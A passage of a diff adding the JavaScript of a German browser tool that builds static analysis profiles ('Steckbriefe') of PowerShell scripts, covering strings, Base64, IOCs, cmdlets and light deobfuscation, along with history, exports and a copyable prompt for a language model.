+3. Welche IOCs sind vorhanden?
+Wenn die Fakten nicht reichen, sage das ausdrücklich.
+STECKBRIEF:
+`;
+const SPEICHER = "steckbrief-werkbank-v1";
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+let zustand = { eintraege: [], aktuell: null, stufe: 3 };
+let sbAktuell = null, zaehler = 0, speicherOk = true;
+
+function neuerEintrag(name, text, bytes, extra) {
+  const e = Object.assign({
+    id: Date.now().toString(36) + "-" + (zaehler++),
+    name: name, label: "unbekannt", text: text,
+    sha: sha256Hex(bytes), bytes: bytes.length,
+    zeit: new Date().toISOString(), beispiel: false,
+  }, extra || {});
+  zustand.eintraege.push(e);
+  return e;
+}
+function aktueller() { return zustand.eintraege.find(e => e.id === zustand.aktuell) || null; }
+function stamm(e) {
+  const i = zustand.eintraege.indexOf(e) + 1;
+  return e.label + "_" + String(i).padStart(4, "0") + "_" + e.sha.slice(0, 10);
+}
+function steckbriefVon(e) { return buildSteckbrief(e.name, e.text, e.bytes, e.sha, e.label); }
+
+function speichern() {
+  try { localStorage.setItem(SPEICHER, JSON.stringify(zustand)); speicherOk = true; }
+  catch (err) { speicherOk = false; }
+  $("speicher-hinweis").textContent = speicherOk
+    ? "Der Verlauf liegt nur in diesem Browser."
+    : "Der Verlauf konnte nicht gespeichert werden (Speicher voll oder gesperrt). Er gilt nur bis zum Schließen der Seite.";
+}
+function laden() {
+  try {
+    const roh = JSON.parse(localStorage.getItem(SPEICHER) || "null");
+    if (roh && Array.isArray(roh.eintraege) && roh.eintraege.length) {
+      zustand.eintraege = roh.eintraege.filter(e => e && typeof e.text === "string" && e.id);
+      zustand.aktuell = roh.aktuell;
+      zustand.stufe = [1, 2, 3].includes(roh.stufe) ? roh.stufe : 3;
+    }
+  } catch (err) { /* ohne Speicher weiterarbeiten */ }
+}
+
+function zeitText(iso) {
+  const d = new Date(iso), heute = new Date();
+  const uhr = d.toLocaleTimeString("de-AT", { hour: "2-digit", minute: "2-digit" });
+  return d.toDateString() === heute.toDateString() ? uhr : d.toLocaleDateString("de-AT", { day: "2-digit", month: "2-digit" }) + " " + uhr;
+}
+function zeigeVerlauf() {
+  $("verlauf-zahl").textContent = zustand.eintraege.length + (zustand.eintraege.length === 1 ? " Skript" : " Skripte");
+  $("verlauf-liste").innerHTML = zustand.eintraege.slice().reverse().map(e =>
+    `<li><button type="button" class="eintrag" data-id="${esc(e.id)}" aria-current="${e.id === zustand.aktuell}">
+      <span class="name" title="${esc(e.name)}">${esc(e.name)}</span>
+      <span class="zusatz"><span class="lab-${esc(e.label)}">${esc(e.label)}</span><span class="hash">${esc(e.sha.slice(0, 8))}</span><span>${esc(zeitText(e.zeit))}</span></span>
+    </button></li>`).join("");
+}
+
+function werteListe(titel, arr, gesamtText) {
+  return `<div class="gruppe"><h4>${titel} <span>${gesamtText || arr.length}</span></h4>${
+    arr.length ? `<ul class="werte">${arr.map(x => `<li>${esc(x)}</li>`).join("")}</ul>` : `<p class="leer">keine</p>`}</div>`;
+}
+function zeigeSteckbrief() {
+  const e = aktueller(), ziel = $("steckbrief");
+  if (!e || !e.text) {
+    sbAktuell = e ? steckbriefVon(e) : null;
+    ziel.innerHTML = `<p class="leer" style="padding-top:16px">Noch kein Code. Links einfügen oder oben Skripte laden, dann entsteht hier der Steckbrief.</p>`;
+    return;
+  }
+  const sb = sbAktuell = steckbriefVon(e), s = sb.stufe3_structure, st = zustand.stufe;
+  let h = `<section class="stufe"><div class="stufe-nr">1</div><div>
+    <h3>Reine Extraktion</h3><p class="technik">String- und Encoding-Extraktor</p>
+    ${werteListe("Strings", s.strings, s.strings.length + " angezeigt, " + s.string_anzahl_gesamt + " gesamt")}
+    <div class="gruppe"><h4>Base64-Blöcke <span>${s.base64_bloecke_gesamt} gesamt, ${s.base64_bloecke_dekodiert.length} dekodierbar</span></h4>
+    ${s.base64_bloecke_dekodiert.map(d => `<pre class="block">${esc(d.dekodiert)}</pre>`).join("") || `<p class="leer">kein dekodierbarer Block</p>`}</div>
+  </div></section>`;
+  if (st >= 2) {
+    const tk = Object.entries(s.auffaellige_tokens);
+    h += `<section class="stufe"><div class="stufe-nr">2</div><div>
+      <h3>Statische Merkmale</h3><p class="technik">Muster- und IOC-Scanner, zusätzlich zu Stufe 1</p>
+      <div class="gruppe"><h4>Auffällige Tokens <span>Name und Vorkommen</span></h4>${
+        tk.length ? `<table class="tokens"><tbody>${tk.map(([k, v]) => `<tr><td>${esc(k)}</td><td>${v}</td></tr>`).join("")}</tbody></table>` : `<p class="leer">keine</p>`}</div>
+      ${werteListe("URLs", s.iocs.urls)}${werteListe("IPv4", s.iocs.ipv4)}${werteListe("Pfade", s.iocs.pfade)}
+      <div class="gruppe"><h4>Beobachtete Cmdlets <span>${s.beobachtete_cmdlets.length}</span></h4>${
+        s.beobachtete_cmdlets.length ? `<p class="fliess">${esc(s.beobachtete_cmdlets.join(", "))}</p>` : `<p class="leer">keine</p>`}</div>
+    </div></section>`;
+  }
+  if (st >= 3) {
+    h += `<section class="stufe"><div class="stufe-nr">3</div><div>
+      <h3>Struktur</h3><p class="technik">Leichte Deobfuskation und beobachtete Abfolge, zusätzlich zu Stufe 2</p>
+      <div class="gruppe"><h4>Beobachtete Abfolge <span>nach erster Fundstelle im Code</span></h4>${
+        s.beobachtete_abfolge.length ? `<ol class="abfolge">${s.beobachtete_abfolge.map(a => `<li>${esc(a)}</li>`).join("")}</ol>` : `<p class="leer">keine Abfolge erkannt</p>`}</div>
+      <div class="gruppe"><h4>Dekodierte Befehle <span>${s.dekodierte_befehle.length}</span></h4>${
+        s.dekodierte_befehle.map(d => `<pre class="block">${esc(d)}</pre>`).join("") || `<p class="leer">keine</p>`}</div>
+      <div class="gruppe"><h4>Deobfuskierter Auszug <span>Backticks entfernt, einfache Konkatenation aufgelöst</span></h4>
+        <pre class="block">${esc(s.deobfuskiert_auszug)}</pre></div>
+    </div></section>`;
+  }
+  ziel.innerHTML = h;
+}
+function zeigeAktiv() {
+  const e = aktueller();
+  $("name").value = e ? e.name : "";
+  $("label").value = e ? e.label : "unbekannt";
+  zeigeMeta();
+}
+function zeigeMeta() {
+  const e = aktueller(), sb = sbAktuell;
+  $("m-sha").textContent = e ? e.sha : "";
+  $("m-bytes").textContent = e ? e.bytes + " Bytes" : "";
+  $("m-zeilen").textContent = sb ? sb.meta.zeilen : "";
+  const teile = [];
+  if (e && e.beispiel) teile.push("<strong>Beispiel.</strong> Harmloser Demo-Code, damit die Seite sofort etwas zeigt. Zum Arbeiten eigene Skripte laden.");
+  if (sb && sb.meta.analyse_gekuerzt) teile.push("<strong>Analyse gekürzt.</strong> Nur die ersten " + MAX_ANALYZE_BYTES + " Zeichen wurden ausgewertet.");
+  $("m-hinweis").innerHTML = teile.join(" ");
+  $("m-hinweis").hidden = !teile.length;
+  document.querySelectorAll(".stufen button").forEach(b => b.setAttribute("aria-pressed", String(Number(b.dataset.stufe) === zustand.stufe)));
+  $("llm-beschreibung").textContent = "Nur die Inhalte bis Stufe " + zustand.stufe + ", als Text. Ohne Label, ohne Dateiname, ohne Hash.";
+  $("llm-vorschau").textContent = sb ? llmText(sb, zustand.stufe) : "";
+}
+function zeigeAlles(mitCode) {
+  const e = aktueller();
+  if (mitCode) $("code").value = e ? e.text : "";
+  zeigeSteckbrief(); zeigeAktiv(); zeigeVerlauf();
+}
+
+function melde(text) {
+  const s = $("status"); s.textContent = text; s.hidden = false;
+  clearTimeout(melde.t); melde.t = setTimeout(() => { s.hidden = true; }, 2600);
+}
+async function kopiere(text, wasText) {
+  let ok = false;
+  try { await navigator.clipboard.writeText(text); ok = true; }
+  catch (err) {
+    const ta = document.createElement("textarea");
+    ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
+    document.body.appendChild(ta); ta.select();
+    try { ok = document.execCommand("copy"); } catch (e2) { ok = false; }
+    ta.remove();
+  }
+  melde(ok ? wasText + " kopiert" : "Kopieren wurde vom Browser blockiert. Text in der Vorschau markieren und von Hand kopieren.");
+}
+function lade_herunter(dateiname, inhalt, typ) {
+  const url = URL.createObjectURL(new Blob([inhalt], { type: typ }));
+  const a = document.createElement("a");
+  a.href = url; a.download = dateiname; document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 2000);
+  melde(dateiname + " gespeichert");
+}
+function manifest() {
+  return zustand.eintraege.map(e => ({ id: stamm(e), quelldatei: e.name, sha256: e.sha, label: e.label, groesse_bytes: e.bytes }));
+}
+
+async function ladeDateien(dateien) {
+  let letzter = null, n = 0;
+  for (const f of dateien) {
+    try {
+      const bytes = new Uint8Array(await f.arrayBuffer());
+      letzter = neuerEintrag(f.name, decodeUtf8Replace(bytes), bytes); n++;
+    } catch (err) { melde(f.name + " konnte nicht gelesen werden"); }
+  }
+  if (letzter) {
+    zustand.aktuell = letzter.id; zeigeAlles(true); speichern();
+    melde(n === 1 ? "1 Skript geladen" : n + " Skripte geladen");
+  }
+}
+
+// Ereignisse
+let timer = null;
+$("code").addEventListener("input", () => {
+  let e = aktueller();
+  if (!e) { e = neuerEintrag("eingefuegt.ps1", "", new Uint8Array(0)); zustand.aktuell = e.id; }
+  const text = $("code").value, bytes = utf8Bytes(text);
+  e.text = text; e.bytes = bytes.length; e.sha = sha256Hex(bytes); e.beispiel = false;
+  clearTimeout(timer);
+  timer = setTimeout(() => { zeigeSteckbrief(); zeigeAktiv(); zeigeVerlauf(); speichern(); }, 150);
+});
+$("name").addEventListener("input", () => { const e = aktueller(); if (!e) return; e.name = $("name").value; sbAktuell = steckbriefVon(e); zeigeVerlauf(); speichern(); });
+$("label").addEventListener("change", () => { const e = aktueller(); if (!e) return; e.label = $("label").value; sbAktuell = steckbriefVon(e); zeigeVerlauf(); speichern(); });
+document.querySelectorAll(".stufen button").forEach(b => b.addEventListener("click", () => {
+  zustand.stufe = Number(b.dataset.stufe); zeigeSteckbrief(); zeigeMeta(); speichern();
+}));
+$("verlauf-liste").addEventListener("click", ev => {
+  const b = ev.target.closest(".eintrag"); if (!b) return;
+  zustand.aktuell = b.dataset.id; zeigeAlles(true); speichern();
+});
+$("btn-laden").addEventListener("click", () => $("datei").click());
+$("datei").addEventListener("change", ev => { ladeDateien(Array.from(ev.target.files)); ev.target.value = ""; });
+$("btn-neu").addEventListener("click", () => {
+  const e = neuerEintrag("eingefuegt.ps1", "", new Uint8Array(0));
+  zustand.aktuell = e.id; zeigeAlles(true); speichern(); $("code").focus();
+});
+$("btn-entfernen").addEventListener("click", () => {
+  const e = aktueller(); if (!e) return;
+  zustand.eintraege = zustand.eintraege.filter(x => x !== e);
+  const rest = zustand.eintraege; zustand.aktuell = rest.length ? rest[rest.length - 1].id : null;
+  zeigeAlles(true); speichern(); melde(e.name + " entfernt");
+});
+let leerenBereit = false;
+$("btn-verlauf-leeren").addEventListener("click", () => {
+  const b = $("btn-verlauf-leeren");
+  if (!leerenBereit) {
+    leerenBereit = true; b.textContent = "Wirklich alles löschen?";
+    setTimeout(() => { leerenBereit = false; b.textContent = "Verlauf löschen"; }, 4000);
+    return;
+  }
+  leerenBereit = false; b.textContent = "Verlauf löschen";
+  zustand.eintraege = []; zustand.aktuell = null; zeigeAlles(true); speichern(); melde("Verlauf gelöscht");
+});
+$("btn-verlauf").addEventListener("click", () => {
+  const zu = $("verlauf").classList.toggle("zu");
+  $("btn-verlauf").textContent = zu ? "Anzeigen" : "Verbergen";
+  $("btn-verlauf").setAttribute("aria-expanded", String(!zu));
+});
+$("btn-prompt").addEventListener("click", () => kopiere(ANALYSE_PROMPT + "<hier der Steckbrief>\n", "Prompt"));
+$("btn-prompt-voll").addEventListener("click", () => { if (sbAktuell) kopiere(ANALYSE_PROMPT + llmText(sbAktuell, zustand.stufe), "Prompt mit Steckbrief bis Stufe " + zustand.stufe); });
+$("btn-llm").addEventListener("click", () => { if (sbAktuell) kopiere(llmText(sbAktuell, zustand.stufe), "Steckbrief bis Stufe " + zustand.stufe); });
+$("btn-json").addEventListener("click", () => { const e = aktueller(); if (e) lade_herunter(stamm(e) + ".json", toJson(steckbriefVon(e)), "application/json"); });
+$("btn-md").addEventListener("click", () => { const e = aktueller(); if (e) lade_herunter(stamm(e) + ".md", toMarkdown(steckbriefVon(e)), "text/markdown"); });
+$("btn-manifest").addEventListener("click", () => lade_herunter("manifest.json", toJson(manifest()), "application/json"));
+$("btn-alle").addEventListener("click", () => {
+  const alle = {}; zustand.eintraege.forEach(e => { alle[stamm(e)] = steckbriefVon(e); });
+  lade_herunter("steckbriefe_alle.json", toJson(alle), "application/json");
+});
+let ziehTiefe = 0;
+const hatDateien = ev => ev.dataTransfer && Array.from(ev.dataTransfer.types || []).includes("Files");
+window.addEventListener("dragenter", ev => { if (hatDateien(ev)) { ziehTiefe++; $("ablage").hidden = false; ev.preventDefault(); } });
+window.addEventListener("dragover", ev => { if (hatDateien(ev)) ev.preventDefault(); });
+window.addEventListener("dragleave", ev => { if (hatDateien(ev) && --ziehTiefe <= 0) { ziehTiefe = 0; $("ablage").hidden = true; } });
+window.addEventListener("drop", ev => {
+  if (!hatDateien(ev)) return;
+  ev.preventDefault(); ziehTiefe = 0; $("ablage").hidden = true;
+  ladeDateien(Array.from(ev.dataTransfer.files));
+});
+
+// Start
+$("prompt-text").textContent = ANALYSE_PROMPT + "<hier der Steckbrief>";
+laden();
+if (!zustand.eintraege.length) {
+  const text = $("beispiel").textContent;
+  const e = neuerEintrag("beispiel.ps1", text, utf8Bytes(text), { beispiel: true });
+  zustand.aktuell = e.id;
+}
+if (!aktueller() && zustand.eintraege.length) zustand.aktuell = zustand.eintraege[zustand.eintraege.length - 1].id;
+zeigeAlles(true);
+</script>
+</body>
+</html>
